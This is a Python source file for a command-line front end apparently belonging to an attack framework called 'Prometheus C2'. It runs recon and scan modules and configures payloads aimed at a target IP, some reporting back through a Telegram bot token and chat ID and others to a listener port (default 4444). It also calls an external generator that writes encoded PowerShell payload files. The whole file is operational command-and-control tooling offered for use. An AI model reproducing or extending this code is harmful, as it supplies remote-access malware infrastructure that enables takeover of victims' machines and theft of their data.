#!/usr/bin/env python3

import sys
import os
import json
import readline
import argparse
import subprocess
import signal
from datetime import datetime

VERSION = "3.1"
CONFIG_FILE = "config.json"

class PrometheusCLI:
    def __init__(self):
        self.config = self.load_config()
        self.commands = {
            'help': self.show_help,
            'exit': self.exit_cli,
            'quit': self.exit_cli,
            'clear': self.clear_screen,
            'set': self.set_config,
            'recon': self.run_recon,
            'configure': self.configure_payload,
            'generate': self.generate_payload,
            'web': self.start_web,
            'modules': self.list_modules,
            'status': self.show_status,
            'scan': self.run_scan
        }
    
    def load_config(self):
        if os.path.exists(CONFIG_FILE):
            try:
                with open(CONFIG_FILE, 'r') as f:
                    return json.load(f)
            except:
                return {"version": VERSION, "interface": "eth0", "payloads": {}}
        return {"version": VERSION, "interface": "eth0", "payloads": {}}
    
    def save_config(self):
        with open(CONFIG_FILE, 'w') as f:
            json.dump(self.config, f, indent=2)
    
    def show_help(self, args=None):
        print(f"""
Prometheus C2 CLI v{VERSION}

COMMANDS:
  help                    Show this help
  exit/quit               Exit CLI
  clear                   Clear screen
  
  set GATEWAY [ip]        Set gateway
  set INTERFACE [iface]   Set network interface
  
  recon --all             Network discovery
  recon -m [module]       Run recon module
  
  configure --payload [type] [target_ip]
                         Configure payload
  
  generate               Generate payload via pmtgener
  web                    Start web interface
  
  modules                List available modules
  scan [ip/range]        Scan target
  status                 Show system status

FLAGS:
  -h, --help             Show help
  -m, --module [name]    Run module
  --list                 List modules
  -iface [interface]     Set interface
  -I [on/off]            Interactive mode
  -v, --version          Show version
""")
    
    def clear_screen(self, args=None):
        os.system('clear' if os.name == 'posix' else 'cls')
    
    def exit_cli(self, args=None):
        self.save_config()
        print("[+] Configuration saved")
        sys.exit(0)
    
    def set_config(self, args):
        if len(args) < 2:
            print("[-] Usage: set [KEY] [VALUE]")
            return
        
        key = args[0].upper()
        value = ' '.join(args[1:])
        
        if key == "GATEWAY":
            self.config['gateway'] = value
            print(f"[+] Gateway: {value}")
        elif key == "INTERFACE":
            self.config['interface'] = value
            print(f"[+] Interface: {value}")
        else:
            print(f"[-] Unknown key: {key}")
    
    def run_recon(self, args):
        if '--all' in args:
            interface = self.config.get('interface', 'eth0')
            print(f"[*] Starting network recon on {interface}")
            
            modules_dir = "modules"
            if os.path.exists(modules_dir):
                recon_script = os.path.join(modules_dir, "recon.py")
                if os.path.exists(recon_script):
                    subprocess.run(['python3', recon_script, '--all', '--interface', interface])
                else:
                    print(f"[-] recon.py not found in {modules_dir}")
            else:
                print(f"[-] {modules_dir} directory not found")
                
        elif '-m' in args:
            try:
                module_index = args.index('-m')
                if module_index + 1 < len(args):
                    module_name = args[module_index + 1]
                    self.run_module(module_name, args[module_index + 2:])
                else:
                    print("[-] Specify module name")
            except ValueError:
                print("[-] Invalid arguments")
        else:
            print("[-] recon --all  OR  recon -m [module]")
    
    def configure_payload(self, args):
        try:
            if '--payload' in args:
                payload_index = args.index('--payload')
                if payload_index + 2 < len(args):
                    payload_type = args[payload_index + 1]
                    target_ip = args[payload_index + 2]
                    
                    if payload_type not in ['better_tg', 'tg_shell', 'standart', 'advanced']:
                        print(f"[-] Invalid payload type: {payload_type}")
                        return
                    
                    print(f"[*] Configuring {payload_type} for {target_ip}")
                    
                    payload_config = {
                        "type": payload_type,
                        "target": target_ip,
                        "timestamp": datetime.now().isoformat()
                    }
                    
                    if payload_type in ['better_tg', 'tg_shell']:
                        token = input("[?] Telegram Bot Token: ").strip()
                        chat_id = input("[?] Chat ID: ").strip()
                        
                        if token and chat_id:
                            payload_config["token"] = token
                            payload_config["chat_id"] = chat_id
                        else:
                            print("[-] Token and Chat ID required")
                            return
                    
                    elif payload_type in ['standart', 'advanced']:
                        port = input("[?] Listener port (4444): ").strip() or "4444"
                        payload_config["port"] = port
                    
                    if 'payloads' not in self.config:
                        self.config['payloads'] = {}
                    
                    payload_id = f"{payload_type}_{target_ip}_{datetime.now().strftime('%H%M%S')}"
                    self.config['payloads'][payload_id] = payload_config
                    self.save_config()
                    
                    print(f"[+] Payload configured: {payload_id}")
                    
                    generate = input("[?] Generate now? (y/n): ").strip().lower()
                    if generate == 'y':
                        self.generate_from_config(payload_id)
                
                else:
                    print("[-] configure --payload [type] [target_ip]")
            else:
                print("[-] configure --payload [type] [target_ip]")
        
        except Exception as e:
            print(f"[-] Error: {e}")
    
    def generate_from_config(self, payload_id):
        if payload_id not in self.config.get('payloads', {}):
            print(f"[-] Config not found: {payload_id}")
            return
        
        config = self.config['payloads'][payload_id]
        payload_type = config['type']
        target_ip = config['target']
        
        print(f"[*] Generating {payload_type} for {target_ip}")
        
        cmd = ['./pmtgener', '-t', payload_type]
        
        if payload_type in ['better_tg', 'tg_shell']:
            cmd.extend(['--token', config['token'], '--id', config['chat_id']])
        elif payload_type in ['standart', 'advanced']:
            cmd.extend(['--ip', target_ip, '--port', config.get('port', '4444')])
        
        cmd.extend(['-EL', '5', '--output', f"payload_{payload_id}.ps1"])
        
        try:
            subprocess.run(cmd, check=True)
            print(f"[+] Payload: payload_{payload_id}.ps1")
        except subprocess.CalledProcessError as e:
            print(f"[-] Generation failed: {e}")
    
    def generate_payload(self, args):
        if args:
            subprocess.run(['./pmtgener'] + args)
        else:
            subprocess.run(['./pmtgener', '--help'])
    
    def start_web(self, args):
        print("[*] Starting web interface...")
        subprocess.Popen(['python3', 'web_server.py', '--port', '8443'], 
                        stdout=subprocess.DEVNULL, 
                        stderr=subprocess.DEVNULL)
        print("[+] Web interface: https://localhost:8443")
    
    def list_modules(self, args=None):
        modules_dir = "modules"
        if os.path.exists(modules_dir):
            print("\nAvailable modules:")
            for file in os.listdir(modules_dir):
                if file.endswith('.py') and file != '__init__.py':
                    print(f"  {file}")
        else:
            print(f"[-] {modules_dir} directory not found")
    
    def show_status(self, args=None):
        interface = self.config.get('interface', 'eth0')
        print(f"""
CLI Version: {VERSION}
Interface:   {interface}
Payloads:    {len(self.config.get('payloads', {}))}
Time:        {datetime.now().strftime('%H:%M:%S')}
""")
    
    def run_scan(self, args):
        if not args:
            print("[-] scan [target]")
            return
        
        target = args[0]
        print(f"[*] Scanning {target}")
        
        modules_dir = "modules"
        if os.path.exists(modules_dir):
            scan_script = os.path.join(modules_dir, "scan.py")
            if os.path.exists(scan_script):
                subprocess.run(['python3', scan_script, target])
            else:
                print(f"[-] scan.py not found")
        else:
            print(f"[-] {modules_dir} not found")
    
    def run_module(self, module_name, args):
        modules_dir = "modules"
        if not os.path.exists(modules_dir):
            print(f"[-] {modules_dir} not found")
            return
        
        module_path = os.path.join(modules_dir, f"{module_name}.py")
        if os.path.exists(module_path):
            subprocess.run(['python3', module_path] + args)
        else:
            print(f"[-] Module not found: {module_name}.py")
    
    def parse_command(self, cmd_line):
        if not cmd_line.strip():
            return None, []
        
        parts = cmd_line.strip().split()
        cmd = parts[0].lower()
        args = parts[1:] if len(parts) > 1 else []
        
        return cmd, args
    
    def run_interactive(self):
        print(f"Prometheus C2 CLI v{VERSION}")
        print("Type 'help' for commands")
        
        readline.parse_and_bind("tab: complete")
        
        while True:
            try:
                cmd_line = input("prm> ").strip()
                
                if not cmd_line:
                    continue
                
                cmd, args = self.parse_command(cmd_line)
                
                if cmd in self.commands:
                    self.commands[cmd](args)
                else:
                    print(f"[-] Unknown command: {cmd}")
            
            except KeyboardInterrupt:
                print("\n[*] Use 'exit' to quit")
            except EOFError:
                self.exit_cli()
            except Exception as e:
                print(f"[-] Error: {e}")
    
    def run_non_interactive(self, args):
        parser = argparse.ArgumentParser(description=f'Prometheus C2 CLI v{VERSION}')
        
        parser.add_argument('-m', '--module', help='Run module')
        parser.add_argument('--list', action='store_true', help='List modules')
        parser.add_argument('-iface', '--interface', help='Network interface')
        parser.add_argument('-I', '--interactive', choices=['on', 'off'], default='on')
        parser.add_argument('-v', '--version', action='store_true')
        parser.add_argument('module_args', nargs=argparse.REMAINDER)
        
        parsed_args, _ = parser.parse_known_args(args)
        
        if parsed_args.version:
            print(f"Prometheus C2 CLI v{VERSION}")
            return
        
        if parsed_args.list:
            self.list_modules()
            return
        
        if parsed_args.interface:
            self.config['interface'] = parsed_args.interface
            print(f"[+] Interface: {parsed_args.interface}")
        
        if parsed_args.module:
            self.run_module(parsed_args.module, parsed_args.module_args)
        elif parsed_args.interactive == 'on':
            self.run_interactive()
        else:
            parser.print_help()

def main():
    cli = PrometheusCLI()
    signal.signal(signal.SIGINT, lambda s, f: None)
    
    if len(sys.argv) > 1:
        cli.run_non_interactive(sys.argv[1:])
    else:
        cli.run_interactive()

if __name__ == "__main__":
    main()